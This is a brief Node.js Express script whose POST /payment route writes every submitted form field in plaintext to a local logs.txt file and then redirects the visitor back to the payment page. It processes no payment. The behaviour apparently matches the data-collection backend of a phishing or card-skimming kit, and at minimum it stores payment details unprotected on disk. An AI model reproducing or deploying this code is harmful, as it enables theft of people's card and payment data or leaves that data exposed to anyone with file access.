const fs = require('fs');
const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));

app.post('/payment', (req, res) => {
  const logStream = fs.createWriteStream('logs.txt', { flags: 'a' });

  for (const [key, value] of Object.entries(req.body)) {
    logStream.write(`${key}=${value}\r\n`);
  }
  logStream.write('\r\n\n\n\n');
  logStream.end();

  res.redirect('/payment.html');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
